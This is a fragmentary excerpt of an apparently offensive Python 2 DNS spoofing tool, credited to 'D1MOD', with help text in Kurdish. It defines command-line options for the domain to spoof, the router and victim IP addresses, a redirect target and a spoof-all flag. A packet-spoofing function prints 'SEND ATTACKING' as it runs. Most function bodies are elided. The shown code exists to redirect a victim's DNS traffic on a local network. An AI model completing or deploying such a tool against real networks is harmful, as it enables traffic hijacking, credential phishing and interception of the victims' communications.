...
def arg_parser():
    ...
    parser.add_argument("-d", "--domain", help="DOMAINEK DABNE BO SPOOFAKA. BO NMWNA : -d https://d1modev.ml")
    parser.add_argument("-r", "--routerIP", help="IP ROUTERKAT YAN AMERE INTERNETAKAT DABNE. BO NMWNA : -r 192.168.0.1")
    parser.add_argument("-v", "--victimIP", help="IP VICTIM DABNE SHERAKAM BO NMWNA : -v 192.168.0.5")
    parser.add_argument("-t", "--redirectto", help="Optional argument to choose the IP to which the victim will be redirected \
                        CODED AND EDITED BY D1MOD ")
    parser.add_argument("-a", "--spoofall", help="SPOOF DNS", action="store_true")
...
def spoofed_pkt(payload, pkt, rIP):
    ...
    print '[+] D1MOD1877 SEND ATTACKING !!!! %s' % pkt[DNSQR].qname[:-1]
